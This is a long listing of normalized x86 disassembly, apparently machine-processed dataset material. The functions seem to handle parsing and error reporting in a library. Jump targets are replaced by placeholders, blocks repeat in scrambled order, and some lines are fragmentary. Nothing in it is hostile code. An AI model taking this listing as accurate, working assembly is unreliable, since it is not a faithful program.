xor ebp ebp
mov eax [ esi + 0xc ]
mov [ esp + 0xc ] ebp
cmp eax edi
mov [ esp + 0x10 ] edi
je r-xdata
push 0xd4
push r--data
push 0x65
push 0x6b
push 0xa
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
add esp 0x30
retn
cmp [ esi + 0x10 ] edi
je r-xdata
cmp [ esi + 0x14 ] edi
je r-xdata
lea eax [ esp + 0x14 ]
push ebx
push eax
call sub_10029990
lea ecx [ esp + 0x30 ]
push ecx
call sub_10029990
mov ebx [ esp + 0x50 ]
add esp 0x8
cmp ebx edi
jne r-xdata
call sub_100299b0
mov edi eax
test edi edi
je r-xdata
call sub_1002dc50
mov ebx eax
test ebx ebx
je r-xdata
push 0x11d
push r--data
push 0x3
push 0x6b
push 0xa
call sub_1001de60
add esp 0x14
test ebp ebp
je r-xdata
mov edx [ esi + 0x10 ]
lea eax [ esp + 0x18 ]
push edx
push eax
call sub_100494a0
add esp 0x8
test eax eax
je r-xdata
test edi edi
je r-xdata
push ebp
call sub_100298f0
add esp 0x4
mov eax [ esp + 0x1c ]
test eax eax
jne r-xdata
mov eax [ esp + 0x48 ]
test eax eax
jne r-xdata
push edi
call sub_100298f0
add esp 0x4
mov eax [ esi + 0x28 ]
test al 0x2
jne r-xdata
mov ecx [ esi + 0x10 ]
lea edx [ esp + 0x18 ]
push ecx
push edx
call sub_100494a0
add esp 0x8
test eax eax
jne r-xdata
test ebp ebp
pop ebx
je r-xdata
push ebx
call sub_1002dcb0
add esp 0x4
test al 0x1
je r-xdata
or [ esp + 0x28 ] 0x4
jmp r-xdata
lea edx [ esp + 0x14 ]
push edx
call sub_100298f0
lea eax [ esp + 0x2c ]
push eax
call sub_100298f0
mov eax [ esp + 0x18 ]
add esp 0x8
pop edi
pop esi
pop ebp
add esp 0x30
retn
push ebp
call sub_100298f0
add esp 0x4
test [ esi + 0x28 ] 0x2
jne r-xdata
mov eax [ esi + 0xc ]
push ebx
push eax
lea ecx [ esi + 0x2c ]
push 0x8
push ecx
call sub_1004c5e0
add esp 0x10
test eax eax
je r-xdata
lea ecx [ esp + 0x18 ]
lea edx [ esp + 0x18 ]
lea eax [ esp + 0x2c ]
push edx
push eax
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
push ecx
mov ecx [ esi + 0x14 ]
push ecx
push edi
call sub_1004cbe0
add esp 0x18
mov edx [ esi + 0xc ]
push edx
push ecx
mov ecx [ esi + 0x14 ]
push ecx
push edi
push esi
call eax
add esp 0x1c
jmp r-xdata
mov ecx [ esi + 0x10 ]
lea edx [ esp + 0x2c ]
push ecx
lea eax [ esp + 0x30 ]
push edx
push eax
call sub_10038680
add esp 0xc
test eax eax
je r-xdata
mov edx [ esi + 0x10 ]
push ebx
push edx
push edi
push edi
push 0x0
call sub_10057d10
add esp 0x14
test eax eax
je r-xdata
test eax eax
je r-xdata
lea ecx [ esp + 0x2c ]
push ecx
call sub_10029870
mov edx [ esi + 0x10 ]
mov ebp eax
push edx
call sub_10029870
add esp 0x8
cmp ebp eax
jg r-xdata
mov eax [ esi + 0x10 ]
push ebx
lea ecx [ esp + 0x1c ]
push eax
push ecx
push 0x0
call sub_10036f90
mov ebp eax
add esp 0x10
test ebp ebp
je r-xdata
mov ebp [ esp + 0x10 ]
lea ecx [ esp + 0x2c ]
jmp r-xdata
mov eax [ esi + 0x10 ]
lea ecx [ esp + 0x2c ]
push eax
lea edx [ esp + 0x30 ]
push ecx
push edx
call sub_10038680
add esp 0xc
test eax eax
je r-xdata
mov esi [ esp + 0x4c ]
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x3c ]
mov edx [ esi + 0x2c ]
push edx
push ebx
mov eax [ eax + 0x14 ]
test eax eax
je r-xdata
mov ebp [ esp + 0x10 ]
mov [ esi ] ebp
mov esi [ esp + 0x50 ]
xor ebp ebp
mov eax [ esi ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
mov [ esi ] edi
mov [ esp + 0x14 ] 0x1
jmp r-xdata
push eax
call sub_100298f0
add esp 0x4
sub_10055960
mov eax 0x40
call sub_1001d0d0
push ebx
push esi
mov esi [ esp + 0x58 ]
xor ebx ebx
mov [ esp + 0x8 ] 0xffffffff
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push 0x131
push r--data
push 0x65
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x14 ]
test ecx ecx
je r-xdata
push eax
call sub_10029870
add esp 0x4
cmp eax 0xa0
je r-xdata
mov eax [ esi + 0xc ]
push eax
call sub_10029870
add esp 0x4
cmp eax 0x2710
jle r-xdata
push 0x137
push r--data
push 0x66
jmp r-xdata
push ebp
lea ecx [ esp + 0x10 ]
push edi
push ecx
call sub_10029990
lea edx [ esp + 0x2c ]
push edx
call sub_10029990
lea eax [ esp + 0x44 ]
push eax
call sub_10029990
add esp 0xc
call sub_1002dc50
mov edi eax
test edi edi
je r-xdata
push 0x13d
push r--data
push 0x67
jmp r-xdata
push 0x71
push 0xa
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
pop ebx
add esp 0x40
retn
push 0x177
push r--data
push 0x3
push 0x71
push 0xa
call sub_1001de60
add esp 0x14
mov ebp [ esp + 0x5c ]
mov eax [ ebp ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
lea ecx [ esp + 0x14 ]
push ecx
call sub_10029950
lea edx [ esp + 0x2c ]
push edx
call sub_10029950
lea eax [ esp + 0x44 ]
push eax
call sub_10029950
mov eax [ esp + 0x1c ]
add esp 0xc
pop edi
pop ebp
pop esi
pop ebx
add esp 0x40
retn
push edi
call sub_1002dcb0
add esp 0x4
mov [ esp + 0x10 ] 0x0
jmp r-xdata
mov ecx [ eax + 0xc ]
test ecx ecx
jne r-xdata
mov ecx [ esi + 0x10 ]
push ecx
push eax
call sub_10029fb0
add esp 0x8
test eax eax
jge r-xdata
mov eax [ ebp + 0x4 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0xc ]
test ecx ecx
jne r-xdata
mov edx [ esi + 0x10 ]
push edx
push eax
call sub_10029fb0
add esp 0x8
test eax eax
jge r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x4 ]
push edi
push eax
lea edx [ esp + 0x30 ]
push ecx
push edx
call sub_10036f90
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x58 ]
mov edx [ esp + 0x54 ]
lea eax [ esp + 0x14 ]
push eax
push ecx
push edx
call sub_10029d50
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
push edi
lea ecx [ esp + 0x2c ]
push eax
lea edx [ esp + 0x1c ]
push ecx
lea eax [ esp + 0x20 ]
push edx
push eax
call sub_10057b10
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esi + 0x10 ]
mov eax [ ebp ]
push edi
lea edx [ esp + 0x2c ]
push ecx
push edx
lea ecx [ esp + 0x34 ]
push eax
push ecx
call sub_10057b10
add esp 0x14
test eax eax
je r-xdata
test [ esi + 0x28 ] 0x1
je r-xdata
mov ecx [ esi + 0x3c ]
mov edx [ esi + 0xc ]
push ebx
push edi
mov eax [ ecx + 0x10 ]
push edx
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
push edi
push edx
lea eax [ esi + 0x2c ]
push 0x8
push eax
call sub_1004c5e0
mov ebx eax
add esp 0x10
test ebx ebx
je r-xdata
mov ecx [ esi + 0x18 ]
lea eax [ esp + 0x34 ]
push eax
mov eax [ esi + 0x14 ]
lea edx [ esp + 0x24 ]
push ecx
push edx
lea ecx [ esp + 0x54 ]
push eax
push ecx
call sub_1005e9d0
add esp 0x20
mov edx [ esi + 0x18 ]
lea ecx [ esp + 0x34 ]
push ecx
lea ecx [ esp + 0x24 ]
push edx
mov edx [ esi + 0x14 ]
push ecx
lea ecx [ esp + 0x54 ]
push edx
push ecx
push esi
call eax
add esp 0x24
jmp r-xdata
mov edx [ esi + 0x10 ]
push edi
lea eax [ esp + 0x40 ]
push edx
lea ecx [ esp + 0x1c ]
push eax
push ecx
push 0x0
call sub_10057d10
add esp 0x14
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx [ ebp ]
lea eax [ esp + 0x14 ]
push edx
push eax
call sub_10029fb0
add esp 0x8
neg eax
sbb eax eax
inc eax
cmp eax 0x1
mov [ esp + 0x10 ] eax
je r-xdata
test edi edi
je r-xdata
sub_10055cb0
mov eax 0x3c
call sub_1001d0d0
push esi
mov esi [ esp + 0x44 ]
mov eax [ esi ]
push eax
call sub_10022ae0
add esp 0x4
test eax eax
je r-xdata
xor eax eax
pop esi
add esp 0x3c
retn
lea ecx [ esp + 0x8 ]
mov [ esp + 0x4 ] ecx
jl r-xdata
push sub_10055c90
push 0x4
push 0x25
lea edx [ esp + 0x10 ]
push rw-data
push edx
mov [ esp + 0x1c ] eax
call sub_10023340
add esp 0x14
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ eax ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
push ecx
push eax
call sub_1001e620
add esp 0x8
cmp eax 0xffffffff
je r-xdata
test eax eax
jne r-xdata
mov edx [ rw-data ]
push eax
push edx
call sub_1001e7c0
add esp 0x8
mov ecx [ esi + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ esp + 0x44 ] edx
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
mov ecx [ ecx ]
lea edx [ esp + 0x44 ]
push ecx
push edx
push 0x0
call [ eax + 0x14 ]
add esp 0xc
pop esi
add esp 0x3c
retn
call edx
push eax
mov eax [ esi + 0x8 ]
lea edx [ esp + 0x48 ]
mov ecx [ eax ]
push ecx
push edx
push 0x0
call sub_10030ec0
add esp 0x10
pop esi
add esp 0x3c
retn
sub_10055d80
mov eax 0x38
call sub_1001d0d0
mov eax [ esp + 0x48 ]
push ebx
push ebp
mov ebp [ esp + 0x44 ]
xor ebx ebx
push esi
test ebp ebp
push edi
jne r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
xor esi esi
mov esi [ eax ]
inc esi
test esi esi
jge r-xdata
mov eax [ esp + 0x54 ]
test eax eax
je r-xdata
mov [ eax ] 0xffffffff
mov eax [ esp + 0x58 ]
push edi
push ebp
call sub_1001e7c0
mov esi eax
mov eax [ esi ]
push eax
call sub_10022ae0
mov ecx [ esp + 0x5c ]
add esp 0xc
cmp eax ecx
jne r-xdata
push ebp
mov edi esi
call sub_1001e7b0
add esp 0x4
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x38
retn
pop edi
pop esi
mov [ eax ] 0xffffffff
pop ebp
xor eax eax
pop ebx
add esp 0x38
retn
mov eax [ esp + 0x54 ]
test eax eax
je r-xdata
mov [ eax ] 0xffffffff
push ebp
inc edi
call sub_1001e7b0
add esp 0x4
cmp edi eax
jl r-xdata
mov eax [ esp + 0x58 ]
test eax eax
jne r-xdata
mov [ eax ] 0xffffffff
mov eax [ esp + 0x58 ]
mov [ eax ] edi
mov ebx esi
jmp r-xdata
test ebx ebx
jne r-xdata
test eax eax
je r-xdata
mov esi [ esp + 0x54 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax [ esp + 0x54 ]
test eax eax
je r-xdata
mov ebx esi
mov ecx [ ebx ]
push ecx
call sub_10022ae0
add esp 0x4
test eax eax
je r-xdata
push ebx
call sub_10036750
add esp 0x4
mov [ esi ] eax
pop edi
pop esi
mov [ eax ] 0xfffffffe
pop ebp
xor eax eax
pop ebx
add esp 0x38
retn
lea edx [ esp + 0x10 ]
mov [ esp + 0x54 ] edx
jl r-xdata
push sub_10055c90
mov [ esp + 0x14 ] eax
push 0x4
push 0x25
lea eax [ esp + 0x60 ]
push rw-data
push eax
call sub_10023340
add esp 0x14
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ eax ]
jmp r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push eax
call sub_1001e620
add esp 0x8
cmp eax 0xffffffff
je r-xdata
test eax eax
je r-xdata
mov edx [ rw-data ]
push eax
push edx
call sub_1001e7c0
add esp 0x8
mov ecx [ ebx + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ esp + 0x58 ] edx
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
mov ecx [ ecx ]
lea edx [ esp + 0x58 ]
push ecx
push edx
push 0x0
call [ eax + 0x14 ]
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x38
retn
call edx
push eax
mov eax [ ebx + 0x8 ]
lea edx [ esp + 0x5c ]
mov ecx [ eax ]
push ecx
push edx
push 0x0
call sub_10030ec0
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
add esp 0x38
retn
sub_10055f50
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
push edi
xor esi esi
xor edi edi
xor ebp ebp
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
push eax
call sub_100266f0
mov edi eax
add esp 0x4
test edi edi
je r-xdata
push 0x58
push r--data
push 0xc
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
je r-xdata
push eax
call sub_100266f0
mov ebp eax
add esp 0x4
test ebp ebp
je r-xdata
push 0x60
push r--data
push 0x41
push 0x69
push 0x22
call sub_1001de60
add esp 0x14
test esi esi
je r-xdata
mov ebx [ esp + 0x1c ]
cmp [ ebx ] 0x0
jne r-xdata
test edi edi
je r-xdata
push esi
call sub_1001d740
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] ebp
mov eax [ ebx ]
push esi
push eax
call sub_1001e6c0
add esp 0x8
test eax eax
jne r-xdata
call sub_1001e3c0
test eax eax
mov [ ebx ] eax
je r-xdata
test ebp ebp
je r-xdata
push edi
call sub_1001d740
add esp 0x4
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
push ebp
call sub_1001d740
add esp 0x4
sub_10056020
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov eax [ esi ]
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
push esi
call sub_1001d740
add esp 0x4
push eax
call sub_1001d740
add esp 0x4
sub_10056070
mov eax [ esp + 0x8 ]
push ebx
push ebp
push esi
test eax eax
push edi
je r-xdata
mov eax [ esp + 0x14 ]
xor esi esi
xor edi edi
xor ebx ebx
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
xor esi esi
xor edi edi
xor ebx ebx
test eax eax
je r-xdata
mov edx r--data
test edx edx
je r-xdata
push eax
call sub_100266f0
mov edi eax
add esp 0x4
test edi edi
je r-xdata
mov eax r--data
test eax eax
je r-xdata
push eax
call sub_100266f0
mov edi eax
add esp 0x4
test edi edi
je r-xdata
push 0x58
push r--data
push 0xc
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
je r-xdata
push edx
call sub_100266f0
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
push 0x60
push r--data
push 0x41
push 0x69
push 0x22
call sub_1001de60
add esp 0x14
test esi esi
je r-xdata
push 0x58
push r--data
push 0xc
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
je r-xdata
push eax
call sub_100266f0
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
push 0x60
push r--data
push 0x41
push 0x69
push 0x22
call sub_1001de60
add esp 0x14
test esi esi
je r-xdata
mov ebp [ esp + 0x1c ]
cmp [ ebp ] 0x0
jne r-xdata
test edi edi
je r-xdata
push esi
call sub_1001d740
add esp 0x4
mov ebp [ esp + 0x1c ]
cmp [ ebp ] 0x0
jne r-xdata
test edi edi
je r-xdata
push esi
call sub_1001d740
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] ebx
mov eax [ ebp ]
push esi
push eax
call sub_1001e6c0
add esp 0x8
test eax eax
jne r-xdata
call sub_1001e3c0
test eax eax
mov [ ebp ] eax
je r-xdata
test ebx ebx
je r-xdata
push edi
call sub_1001d740
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] ebx
mov ecx [ ebp ]
push esi
push ecx
call sub_1001e6c0
add esp 0x8
test eax eax
jne r-xdata
call sub_1001e3c0
test eax eax
mov [ ebp ] eax
je r-xdata
test ebx ebx
je r-xdata
push edi
call sub_1001d740
add esp 0x4
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
push ebx
call sub_1001d740
add esp 0x4
push ebx
call sub_1001d740
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
sub_10056220
mov eax [ esp + 0x8 ]
push edi
xor edi edi
test eax eax
jne r-xdata
push esi
push 0x0
push eax
call sub_100610d0
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop edi
retn
push 0x8e
push r--data
push 0x41
push 0x79
push 0x22
call sub_1001de60
add esp 0x14
push esi
call sub_100355c0
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
push esi
call sub_10029950
add esp 0x4
mov eax edi
pop esi
pop edi
retn
sub_10056280
mov eax [ esp + 0x8 ]
push edi
xor edi edi
test eax eax
jne r-xdata
push esi
push 0x0
push eax
call sub_1002f620
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop edi
retn
push 0x9a
push r--data
push 0x41
push 0x78
push 0x22
call sub_1001de60
add esp 0x14
push esi
call sub_100355c0
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
push esi
call sub_10029950
add esp 0x4
mov eax edi
pop esi
pop edi
retn
sub_100562e0
mov eax 0x4
call sub_1001d0d0
push esi
mov esi [ esp + 0x10 ]
test esi esi
push edi
mov [ esp + 0x8 ] 0x0
jne r-xdata
call sub_100299b0
mov [ esp + 0x8 ] eax
mov al [ esi ]
cmp al 0x2d
jne r-xdata
push 0xa6
push r--data
push 0x6d
push 0x6c
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ecx
retn
xor edi edi
inc esi
mov edi 0x1
jmp r-xdata
lea ecx [ esp + 0x8 ]
push esi
push ecx
call sub_10035920
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
cmp [ esi ] 0x30
jne r-xdata
mov eax [ esp + 0x8 ]
push eax
call sub_10029950
push 0xb9
push r--data
push 0x64
push 0x6c
push 0x22
call sub_1001de60
add esp 0x18
xor eax eax
pop edi
pop esi
pop ecx
retn
cmp [ eax + esi ] 0x0
jne r-xdata
add esi 0x2
lea eax [ esp + 0x8 ]
push esi
push eax
call sub_100357a0
jmp r-xdata
cmp al 0x58
jne r-xdata
mov eax [ esp + 0x8 ]
test edi edi
je r-xdata
add esp 0x8
test eax eax
je r-xdata
push 0x0
push eax
call sub_1002f540
mov edx [ esp + 0x10 ]
mov esi eax
push edx
call sub_10029950
add esp 0xc
test esi esi
jne r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
jne r-xdata
test edi edi
je r-xdata
push 0xc2
push r--data
push 0x65
push 0x6c
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ecx
retn
xor edi edi
mov eax esi
pop edi
pop esi
pop ecx
retn
mov eax [ esi + 0x4 ]
or ah 0x1
mov [ esi + 0x4 ] eax
sub_100563f0
mov eax [ esp + 0x8 ]
push ebx
push ebp
xor ebp ebp
cmp eax ebp
push esi
jne r-xdata
push ebp
push eax
mov [ esp + 0x1c ] ebp
call sub_1002f620
mov esi eax
add esp 0x8
cmp esi ebp
je r-xdata
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
push 0x9a
push r--data
push 0x41
push 0x78
push 0x22
call sub_1001de60
add esp 0x14
push esi
call sub_100355c0
add esp 0x4
cmp eax ebp
mov [ esp + 0x14 ] eax
jne r-xdata
mov eax [ esp + 0x10 ]
push edi
xor esi esi
xor edi edi
test eax eax
je r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
retn
push esi
call sub_10029950
mov ebx [ esp + 0x18 ]
add esp 0x4
cmp ebx ebp
jne r-xdata
push ebx
call sub_100266f0
mov ebp eax
add esp 0x4
test ebp ebp
je r-xdata
push eax
call sub_100266f0
mov edi eax
add esp 0x4
test edi edi
je r-xdata
push 0x60
push r--data
push 0x41
push 0x69
push 0x22
call sub_1001de60
add esp 0x14
test esi esi
je r-xdata
push 0x58
push r--data
push 0xc
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
je r-xdata
test edi edi
je r-xdata
push esi
call sub_1001d740
add esp 0x4
mov ebx [ esp + 0x1c ]
cmp [ ebx ] 0x0
jne r-xdata
test ebp ebp
je r-xdata
push edi
call sub_1001d740
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] ebp
mov eax [ ebx ]
push esi
push eax
call sub_1001e6c0
add esp 0x8
test eax eax
jne r-xdata
call sub_1001e3c0
test eax eax
mov [ ebx ] eax
je r-xdata
mov ecx [ esp + 0x18 ]
xor esi esi
push ecx
call sub_1001d740
add esp 0x4
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn
push ebp
call sub_1001d740
add esp 0x4
mov ecx [ esp + 0x18 ]
mov esi 0x1
push ecx
call sub_1001d740
add esp 0x4
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn
sub_10056540
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
push 0xe5
push r--data
push 0x68
push 0x6e
push 0x22
call sub_1001de60
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x4 ]
mov edx [ ebp ]
push eax
push r--data
push ecx
push r--data
push edx
push r--data
push 0x6
call sub_1001e1a0
add esp 0x30
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov esi r--data
mov eax edi
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov ecx [ esp + 0x18 ]
pop edi
pop esi
pop ebp
mov [ ecx ] 0xff
mov eax 0x1
pop ebx
retn
mov esi r--data
mov eax edi
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi r--data
mov eax edi
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi r--data
mov eax edi
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi r--data
mov eax edi
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi r--data
mov eax edi
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi r--data
mov eax edi
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
mov [ eax ] 0x0
mov eax 0x1
pop ebx
retn
mov esi r--data
mov eax edi
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi r--data
mov eax edi
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi r--data
mov eax edi
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi r--data
mov eax edi
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi r--data
mov eax edi
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_10056890
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x8 ]
push eax
push 0x0
call sub_100562e0
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esp + 0xc ]
pop esi
mov [ ecx ] eax
mov eax 0x1
retn
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax [ esi ]
push ecx
push r--data
push edx
push r--data
push eax
push r--data
push 0x6
call sub_1001e1a0
add esp 0x1c
xor eax eax
pop esi
retn
sub_100568e0
mov eax 0x10
call sub_1001d0d0
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
xor esi esi
push eax
mov [ esp + 0x14 ] esi
call sub_100266f0
mov [ esp + 0x28 ] esi
mov [ esp + 0x20 ] eax
mov ebx eax
mov esi eax
mov al [ eax ]
add esp 0x4
test al al
mov [ esp + 0x14 ] 0x1
mov [ esp + 0x18 ] ebx
je r-xdata
push esi
call sub_10056e20
add esp 0x4
test eax eax
jne r-xdata
cmp al 0xd
je r-xdata
lea edx [ esp + 0x10 ]
push edx
push 0x0
push eax
call sub_10055f50
add esp 0xc
push 0x146
cmp [ esp + 0x14 ] 0x2
jne r-xdata
cmp al 0xa
je r-xdata
mov al [ esi ]
mov ebp esi
test al al
je r-xdata
mov ecx [ esp + 0x14 ]
dec ecx
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
xor edx edx
mov dl [ ebp ]
push edx
call isspace
add esp 0x4
test eax eax
je r-xdata
cmp al 0x3a
jne r-xdata
dec ecx
jne r-xdata
push 0x13c
push r--data
push 0x6d
jmp r-xdata
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea esi [ ecx + ebp - 0x1 ]
cmp esi ebp
je r-xdata
mov al [ ebp + 0x1 ]
inc ebp
test al al
jne r-xdata
cmp al 0x2c
jne r-xdata
mov [ ebx ] 0x0
mov al [ esi ]
test al al
mov [ esp + 0x14 ] 0x2
je r-xdata
mov al [ ebx + 0x1 ]
inc ebx
test al al
mov [ esp + 0x18 ] ebx
je r-xdata
cmp al 0x2c
jne r-xdata
push 0x6d
push 0x22
call sub_1001de60
mov eax [ esp + 0x30 ]
add esp 0x14
push eax
call sub_1001d740
mov ecx [ esp + 0x14 ]
push sub_10056020
